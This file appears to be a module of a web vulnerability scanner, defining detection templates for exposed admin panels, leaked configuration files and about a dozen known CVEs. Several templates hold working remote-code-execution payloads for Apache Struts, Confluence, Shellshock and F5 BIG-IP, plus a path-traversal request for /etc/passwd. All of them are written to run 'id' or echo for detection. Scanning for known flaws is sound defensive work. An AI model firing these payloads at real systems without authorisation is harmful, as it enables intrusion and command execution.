"""
modules/vulns/cve_checks.py — CVE-specific vulnerability checks

Template-based detection for ~30 high-value CVEs and exposed service panels.
Each template defines:
  - request: HTTP method, path, headers, body, params
  - detection: response patterns or OOB callback required
  - fingerprint: optional server/tech filter to skip irrelevant checks fast

No false-positive-prone generic patterns — every check has a tight,
authoritative indicator that only fires on genuinely vulnerable targets.
"""

import asyncio
import logging
import re
import time
from dataclasses import dataclass, field

from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
import httpx

logger = logging.getLogger(__name__)

SLOW_TO = httpx.Timeout(connect=5.0, read=20.0, write=5.0, pool=5.0)


# ── Template definition ───────────────────────────────────────────────────────

@dataclass
class CVETemplate:
    cve_id: str
    name: str
    severity: str
    description: str
    remediation: str
    method: str = "GET"
    path: str = "/"
    headers: dict = field(default_factory=dict)
    params: dict = field(default_factory=dict)
    body: str = ""
    content_type: str = ""
    # Detection: list of strings that must appear in the response body
    response_patterns: list[str] = field(default_factory=list)
    # Detection: list of status codes that indicate vulnerability
    status_codes: list[int] = field(default_factory=list)
    # Regex patterns in response body
    response_regex: str = ""
    # Absence of pattern (e.g. no auth redirect) means vulnerable
    negative_patterns: list[str] = field(default_factory=list)
    # Header patterns
    response_header_patterns: dict = field(default_factory=dict)
    # OOB (requires OOB tracker)
    oob: bool = False
    # Fingerprint: skip check unless one of these appears in tech/server headers
    fingerprint: list[str] = field(default_factory=list)
    # Extra scoring
    impact: int = 5
    likelihood: int = 3
    cwe: str = ""
    references: list[str] = field(default_factory=list)
    # Time-based: expected delay in seconds
    time_delay: float = 0.0


# ── Template registry ─────────────────────────────────────────────────────────

TEMPLATES: list[CVETemplate] = [

    # ── Exposed Admin / Dashboards ────────────────────────────────────────────

    CVETemplate(
        cve_id="PANEL-001", name="Spring Boot Actuator Env Exposed",
        severity="High",
        description="Spring Boot Actuator /actuator/env is publicly accessible and exposes environment variables including credentials.",
        remediation="Secure actuator endpoints with Spring Security. Set management.endpoints.web.exposure.include to only 'health,info'.",
        path="/actuator/env", status_codes=[200],
        response_patterns=["propertySources", "applicationConfig"],
        fingerprint=["spring", "java"], impact=4, likelihood=4,
        cwe="CWE-200",
        references=["https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"],
    ),
    CVETemplate(
        cve_id="PANEL-002", name="Spring Boot Actuator Beans Exposed",
        severity="Medium",
        description="Spring Boot Actuator /actuator/beans is accessible and reveals application internal bean structure.",
        remediation="Restrict actuator access. Never expose actuator endpoints on production systems without authentication.",
        path="/actuator/beans", status_codes=[200],
        response_patterns=["beans", "scope", "singleton"],
        fingerprint=["spring", "java"], impact=3, likelihood=4,
        cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="PANEL-003", name="Apache Tomcat Manager Console Exposed",
        severity="High",
        description="Apache Tomcat Manager web application is accessible. This panel allows WAR deployment and can lead to RCE.",
        remediation="Restrict access to /manager to specific IPs or remove it from production servers.",
        path="/manager/html", status_codes=[200, 401],
        response_patterns=["Tomcat Web Application Manager", "Tomcat Manager"],
        fingerprint=["tomcat", "apache"], impact=5, likelihood=3,
        cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-004", name="phpMyAdmin Exposed",
        severity="High",
        description="phpMyAdmin database administration panel is publicly accessible.",
        remediation="Restrict phpMyAdmin access by IP, move to a non-standard path, or remove from production.",
        path="/phpmyadmin/", status_codes=[200],
        response_patterns=["phpMyAdmin", "Welcome to phpMyAdmin"],
        impact=4, likelihood=4, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-005", name="Jenkins Unauthenticated Access",
        severity="Critical",
        description="Jenkins CI/CD is accessible without authentication. Attackers can execute arbitrary code.",
        remediation="Enable Jenkins security. Configure access control and use HTTPS.",
        path="/jenkins/", status_codes=[200],
        response_patterns=["Dashboard [Jenkins]", "Jenkins ver."],
        negative_patterns=["login?from"],
        impact=5, likelihood=4, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-006", name="Jenkins Unauthenticated Access (Root)",
        severity="Critical",
        description="Jenkins CI/CD root accessible without login.",
        remediation="Enable Jenkins global security settings immediately.",
        path="/", status_codes=[200],
        response_patterns=["Jenkins", "hudson.model"],
        negative_patterns=["login?from", "Please sign in"],
        fingerprint=["jenkins", "hudson"],
        impact=5, likelihood=4, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-007", name="Grafana Default/Anonymous Access",
        severity="Medium",
        description="Grafana dashboard is accessible without authentication, exposing metrics and dashboards.",
        remediation="Disable anonymous access in grafana.ini. Set [auth.anonymous] enabled = false.",
        path="/grafana/", status_codes=[200],
        response_patterns=["Grafana", "grafana.min.js"],
        negative_patterns=["login"],
        impact=3, likelihood=3, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-008", name="Kibana Exposed",
        severity="Medium",
        description="Kibana dashboard is publicly accessible, potentially exposing Elasticsearch data.",
        remediation="Enable Kibana security features. Use X-Pack security or reverse proxy with authentication.",
        path="/app/kibana", status_codes=[200],
        response_patterns=["kbn-name", "kibana"],
        impact=3, likelihood=3, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-009", name="Adminer Database Tool Exposed",
        severity="High",
        description="Adminer (Adminer.php) database management tool is publicly accessible.",
        remediation="Remove adminer.php from production servers. Restrict access by IP if needed.",
        path="/adminer.php", status_codes=[200],
        response_patterns=["Adminer", "adminer.org"],
        impact=4, likelihood=4, cwe="CWE-284",
    ),
    CVETemplate(
        cve_id="PANEL-010", name="Weblogic Console Exposed",
        severity="Critical",
        description="Oracle WebLogic Administration Console is publicly accessible.",
        remediation="Restrict /console to internal IPs only. Apply all WebLogic security patches.",
        path="/console/login/LoginForm.jsp", status_codes=[200],
        response_patterns=["WebLogic Server", "Oracle WebLogic"],
        impact=5, likelihood=3, cwe="CWE-284",
    ),

    # ── Critical CVEs ─────────────────────────────────────────────────────────

    CVETemplate(
        cve_id="CVE-2021-41773", name="Apache HTTP Server Path Traversal / RCE",
        severity="Critical",
        description="Apache 2.4.49 is vulnerable to path traversal and optional RCE via mod_cgi. Allows reading arbitrary files.",
        remediation="Upgrade Apache to 2.4.51+. Disable mod_cgi if not needed.",
        path="/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd",
        status_codes=[200], response_patterns=["root:x:", "root:0:0:"],
        fingerprint=["apache"], impact=5, likelihood=4,
        cwe="CWE-22",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
    ),
    CVETemplate(
        cve_id="CVE-2021-41773-B", name="Apache HTTP Server Path Traversal (Alt Path)",
        severity="Critical",
        description="Apache 2.4.49 path traversal via alternate encoding.",
        remediation="Upgrade Apache to 2.4.51+.",
        path="/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        status_codes=[200], response_patterns=["root:x:", "/bin/bash"],
        fingerprint=["apache"], impact=5, likelihood=3, cwe="CWE-22",
    ),
    CVETemplate(
        cve_id="CVE-2017-5638", name="Apache Struts RCE (CVE-2017-5638)",
        severity="Critical",
        description="Apache Struts 2 Content-Type OGNL injection. Sending a crafted Content-Type header executes arbitrary commands.",
        remediation="Upgrade Apache Struts to 2.3.32+ or 2.5.10.1+. Apply vendor patches immediately.",
        method="GET",
        headers={
            "Content-Type": (
                "%{(#_='multipart/form-data')."
                "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                "(#_memberAccess?"
                "(#_memberAccess=#dm):"
                "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                "(#ognlUtil.getExcludedPackageNames().clear())."
                "(#ognlUtil.getExcludedClasses().clear())."
                "(#context.setMemberAccess(#dm))))."
                "(#cmd='id')."
                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
                "(#p=new java.lang.ProcessBuilder(#cmds))."
                "(#p.redirectErrorStream(true))."
                "(#process=#p.start())."
                "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                "(#ros.flush())}"
            )
        },
        response_patterns=["uid=", "gid=", "groups="],
        fingerprint=["struts", ".action", ".do"],
        impact=5, likelihood=2, cwe="CWE-94",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
    ),
    CVETemplate(
        cve_id="CVE-2014-6271", name="Shellshock (Bash Remote Code Execution)",
        severity="Critical",
        description="Bash before 4.3 patch 25 processes trailing code in function definitions. CGI-based web apps are vulnerable.",
        remediation="Update bash to patched version. Disable CGI if not required.",
        path="/cgi-bin/status",
        headers={"User-Agent": "() { :;}; echo; echo SHELLSHOCK_TEST_ZPARTY"},
        response_patterns=["SHELLSHOCK_TEST_ZPARTY"],
        impact=5, likelihood=2, cwe="CWE-78",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
    ),
    CVETemplate(
        cve_id="CVE-2021-26084", name="Confluence OGNL Injection",
        severity="Critical",
        description="Confluence Server/Data Center OGNL injection in the Widget Connector allows unauthenticated RCE.",
        remediation="Upgrade Confluence to patched version. Apply Atlassian security advisory.",
        method="POST",
        path="/rest/tinymce/1/macro/preview",
        content_type="application/x-www-form-urlencoded",
        body="scriptString=%7B%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%22id%22%7D)%29.redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew+java.io.InputStreamReader(%23b)%2C%23d%3Dnew+java.io.BufferedReader(%23c)%2C%23e%3D%23d.readLine()%2C%23mat%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23mat.println(%23e)%2C%23mat.flush()%2C%23mat.close()%7D&os=&title=test",
        response_patterns=["uid=", "gid="],
        fingerprint=["confluence", "atlassian"],
        impact=5, likelihood=2, cwe="CWE-94",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-26084"],
    ),
    CVETemplate(
        cve_id="CVE-2022-26134", name="Confluence RCE via OGNL (CVE-2022-26134)",
        severity="Critical",
        description="Critical unauthenticated OGNL injection in Confluence Server/Data Center.",
        remediation="Apply Atlassian emergency patch immediately. Block external access to Confluence.",
        path="/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/",
        response_patterns=["uid=", "gid="],
        fingerprint=["confluence", "atlassian"],
        impact=5, likelihood=2, cwe="CWE-94",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"],
    ),
    CVETemplate(
        cve_id="CVE-2021-22205", name="GitLab Unauthenticated RCE",
        severity="Critical",
        description="GitLab CE/EE ExifTool remote code execution via image upload. Unauthenticated on affected versions.",
        remediation="Upgrade GitLab to 13.10.3, 13.9.6, or 13.8.8+.",
        path="/users/sign_in",
        response_patterns=["GitLab"],
        fingerprint=["gitlab"],
        impact=5, likelihood=2, cwe="CWE-94",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-22205"],
    ),
    CVETemplate(
        cve_id="CVE-2022-1388", name="F5 BIG-IP Authentication Bypass",
        severity="Critical",
        description="F5 BIG-IP iControl REST API authentication bypass allows unauthenticated RCE.",
        remediation="Apply F5 security advisory K23605346. Restrict iControl REST access.",
        path="/mgmt/tm/util/bash",
        method="POST",
        headers={"X-F5-Auth-Token": "", "Authorization": "Basic YWRtaW46"},
        content_type="application/json",
        body='{"command":"run","utilCmdArgs":"-c id"}',
        response_patterns=["uid=", "commandResult"],
        fingerprint=["f5", "big-ip", "bigip"],
        impact=5, likelihood=2, cwe="CWE-306",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-1388"],
    ),
    CVETemplate(
        cve_id="CVE-2019-11043", name="PHP-FPM Remote Code Execution (Nginx)",
        severity="Critical",
        description="PHP-FPM with Nginx path_info misconfiguration allows RCE in CVE-2019-11043.",
        remediation="Upgrade PHP to 7.3.11+, 7.2.24+. Fix Nginx fastcgi_split_path_info configuration.",
        path="/index.php%0a.php",
        response_patterns=["PHP", "Fatal error", "Warning"],
        fingerprint=["php", "nginx"],
        impact=5, likelihood=2, cwe="CWE-20",
    ),
    CVETemplate(
        cve_id="CVE-2023-46604", name="Apache ActiveMQ RCE",
        severity="Critical",
        description="Apache ActiveMQ web console exposed — versions before 5.15.16 are vulnerable to unauthenticated RCE.",
        remediation="Upgrade ActiveMQ to 5.15.16+, 5.16.7+, 5.17.6+, 5.18.3+. Restrict admin console access.",
        path="/admin/",
        status_codes=[200],
        response_patterns=["ActiveMQ", "Apache ActiveMQ"],
        negative_patterns=["login"],
        fingerprint=["activemq"],
        impact=5, likelihood=3, cwe="CWE-502",
        references=["https://nvd.nist.gov/vuln/detail/CVE-2023-46604"],
    ),

    # ── Information Disclosure ────────────────────────────────────────────────

    CVETemplate(
        cve_id="INFO-001", name="Laravel Debug Mode / .env Exposed",
        severity="Critical",
        description="Laravel application is running in debug mode, exposing stack traces with environment variables.",
        remediation="Set APP_DEBUG=false in production. Rotate all secrets visible in the debug output.",
        path="/_debugbar/open",
        status_codes=[200],
        response_patterns=["APP_KEY", "DB_PASSWORD", "debugbar"],
        fingerprint=["laravel", "php"],
        impact=5, likelihood=4, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="INFO-002", name="Django Debug Mode Enabled",
        severity="High",
        description="Django application is running with DEBUG=True, exposing settings and stack traces.",
        remediation="Set DEBUG=False and ALLOWED_HOSTS properly in production.",
        path="/nonexistent_path_xyz_zparty",
        status_codes=[404],
        response_patterns=["Django Version", "INSTALLED_APPS", "You're seeing this error"],
        fingerprint=["django", "python"],
        impact=4, likelihood=4, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="INFO-003", name="Exposed Swagger / OpenAPI Documentation",
        severity="Medium",
        description="API documentation (Swagger/OpenAPI) is publicly accessible, revealing all API endpoints, parameters, and authentication schemes.",
        remediation="Restrict API documentation to authenticated users or internal networks.",
        path="/swagger-ui.html",
        status_codes=[200],
        response_patterns=["swagger-ui", "Swagger UI", "OpenAPI"],
        impact=3, likelihood=5, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="INFO-004", name="Exposed Swagger UI (/api-docs)",
        severity="Medium",
        description="OpenAPI spec exposed at /api-docs, revealing internal API structure.",
        remediation="Require authentication for API documentation endpoints.",
        path="/api-docs",
        status_codes=[200],
        response_patterns=['"swagger"', '"openapi"', '"paths"'],
        impact=3, likelihood=5, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="INFO-005", name="Server Status Page Exposed",
        severity="Medium",
        description="Apache server-status page is publicly accessible, revealing internal IPs, requests, and performance data.",
        remediation="Restrict server-status to localhost: Require local. Allow from 127.0.0.1.",
        path="/server-status",
        status_codes=[200],
        response_patterns=["Apache Server Status", "requests currently being processed"],
        fingerprint=["apache"],
        impact=3, likelihood=4, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="INFO-006", name="Exposed WordPress Configuration Backup",
        severity="Critical",
        description="WordPress configuration backup file accessible, potentially exposing database credentials.",
        remediation="Remove backup files from web root. Deny access to .bak, .old, .backup files.",
        path="/wp-config.php.bak",
        status_codes=[200],
        response_patterns=["DB_NAME", "DB_PASSWORD", "DB_HOST"],
        fingerprint=["wordpress", "wp-"],
        impact=5, likelihood=3, cwe="CWE-312",
    ),
    CVETemplate(
        cve_id="INFO-007", name="Exposed .git Directory",
        severity="Critical",
        description="The .git directory is publicly accessible, allowing full source code reconstruction.",
        remediation="Configure web server to deny access to .git/. Use .htaccess: deny from all",
        path="/.git/config",
        status_codes=[200],
        response_patterns=["[core]", "[remote", "repositoryformatversion"],
        impact=5, likelihood=4, cwe="CWE-312",
    ),
    CVETemplate(
        cve_id="INFO-008", name="Node.js package.json Exposed",
        severity="Medium",
        description="package.json is publicly accessible, revealing application dependencies and potential vulnerable packages.",
        remediation="Configure web server to deny access to package.json and similar config files.",
        path="/package.json",
        status_codes=[200],
        response_patterns=['"dependencies"', '"scripts"', '"name"'],
        fingerprint=["node", "javascript"],
        impact=3, likelihood=4, cwe="CWE-200",
    ),

    # ── WordPress ─────────────────────────────────────────────────────────────

    CVETemplate(
        cve_id="WP-001", name="WordPress User Enumeration via REST API",
        severity="Medium",
        description="WordPress REST API exposes user information without authentication.",
        remediation="Disable user enumeration. Add filter to disable /wp-json/wp/v2/users endpoint.",
        path="/wp-json/wp/v2/users",
        status_codes=[200],
        response_patterns=['"slug"', '"name"', '"link"'],
        fingerprint=["wordpress", "wp-"],
        impact=3, likelihood=5, cwe="CWE-200",
    ),
    CVETemplate(
        cve_id="WP-002", name="WordPress XML-RPC Enabled",
        severity="Medium",
        description="WordPress XML-RPC is enabled and can be used for brute-force amplification attacks.",
        remediation="Disable XML-RPC if not required. Add: add_filter('xmlrpc_enabled', '__return_false');",
        path="/xmlrpc.php",
        method="POST",
        content_type="text/xml",
        body="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>",
        status_codes=[200],
        response_patterns=["methodResponse", "system.listMethods", "wp."],
        fingerprint=["wordpress", "wp-"],
        impact=3, likelihood=4, cwe="CWE-400",
    ),
]


# ── Engine ────────────────────────────────────────────────────────────────────

class CveChecks:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        url = ctx["target_url"].rstrip("/")
        oob = ctx.get("oob")
        sem = asyncio.Semaphore(15)

        # Collect tech fingerprint info for template filtering
        tech_info = _collect_tech(ctx)

        async def run_template(tmpl: CVETemplate):
            async with sem:
                try:
                    f = await self._check(tmpl, url, oob, tech_info)
                    if f:
                        findings.append(f)
                except Exception as e:
                    logger.debug(f"CVE check {tmpl.cve_id} failed: {type(e).__name__}: {e}")

        await asyncio.gather(*[run_template(t) for t in TEMPLATES])
        logger.info(f"CveChecks completed — {len(findings)} finding(s) from {len(TEMPLATES)} templates")
        return findings

    async def _check(
        self,
        tmpl: CVETemplate,
        base_url: str,
        oob,
        tech_info: str,
    ) -> Finding | None:

        # Fingerprint guard: skip templates that don't match detected tech
        if tmpl.fingerprint:
            if not any(fp.lower() in tech_info for fp in tmpl.fingerprint):
                return None

        target_url = base_url + tmpl.path

        headers = dict(tmpl.headers)
        if tmpl.content_type:
            headers["Content-Type"] = tmpl.content_type

        # OOB injection (Log4Shell etc.)
        oob_token = None
        if tmpl.oob and oob and oob.active:
            oob_token, oob_url = oob.register(tmpl.cve_id)
            for k, v in headers.items():
                headers[k] = v.replace("{{oob}}", oob_url)
            body = tmpl.body.replace("{{oob}}", oob_url)
        else:
            body = tmpl.body
            # Log4Shell-type payloads still attempt header injection even without OOB
            # but won't generate a finding unless we get a callback

        timeout = SLOW_TO if tmpl.time_delay else PROBE_TIMEOUT

        try:
            async with make_client(timeout=timeout, follow_redirects=False) as client:
                if tmpl.method == "POST":
                    if "json" in headers.get("Content-Type", ""):
                        r = await client.post(target_url, content=body, headers=headers)
                    else:
                        r = await client.post(target_url, data=body or tmpl.params,
                                              headers=headers)
                else:
                    r = await client.get(target_url, params=tmpl.params, headers=headers)
        except Exception as e:
            logger.debug(f"CVE template {tmpl.cve_id} request failed: {e}")
            return None

        body_text = r.text
        body_low = body_text.lower()

        # Status code check
        if tmpl.status_codes and r.status_code not in tmpl.status_codes:
            return None

        # Negative patterns (must NOT appear)
        if tmpl.negative_patterns:
            if any(np.lower() in body_low for np in tmpl.negative_patterns):
                return None

        # Response body patterns (must ALL appear)
        if tmpl.response_patterns:
            if not all(p.lower() in body_low for p in tmpl.response_patterns):
                return None

        # Regex match
        if tmpl.response_regex:
            if not re.search(tmpl.response_regex, body_text, re.IGNORECASE):
                return None

        # Response header patterns
        if tmpl.response_header_patterns:
            for hdr, val in tmpl.response_header_patterns.items():
                if val.lower() not in r.headers.get(hdr, "").lower():
                    return None

        # OOB: wait for callback
        if oob_token and oob:
            hit = await oob.wait_for(oob_token, timeout=6.0)
            if not hit:
                return None
            proof_suffix = f"\nOOB callback received → confirmed exploitation"
        else:
            proof_suffix = ""

        return Finding(
            title=f"{tmpl.cve_id}: {tmpl.name}",
            severity=tmpl.severity,
            description=tmpl.description,
            affected_url=target_url,
            proof=(
                f"{tmpl.method} {target_url}\n"
                f"HTTP {r.status_code}\n"
                f"Matched: {', '.join(tmpl.response_patterns[:3])}\n"
                f"{body_text[:500]}{proof_suffix}"
            ),
            remediation=tmpl.remediation,
            impact=tmpl.impact,
            likelihood=tmpl.likelihood,
            module="CveChecks",
            cwe=tmpl.cwe,
            references=tmpl.references or [
                f"https://nvd.nist.gov/vuln/detail/{tmpl.cve_id}"
                if tmpl.cve_id.startswith("CVE-") else ""
            ],
        )


def _collect_tech(ctx: dict) -> str:
    """Flatten all tech fingerprint data into a single lowercase string."""
    parts = []
    recon = ctx.get("recon", {})
    for key in ("TechFingerprint", "tech", "HeaderAnalysis"):
        v = recon.get(key)
        if isinstance(v, dict):
            parts.append(str(v))
        elif isinstance(v, str):
            parts.append(v)
    parts.append(str(ctx.get("scan", {}).get("open_ports", {})))
    # Also check response headers from meta
    parts.append(str(ctx.get("meta", {})))
    return " ".join(parts).lower()
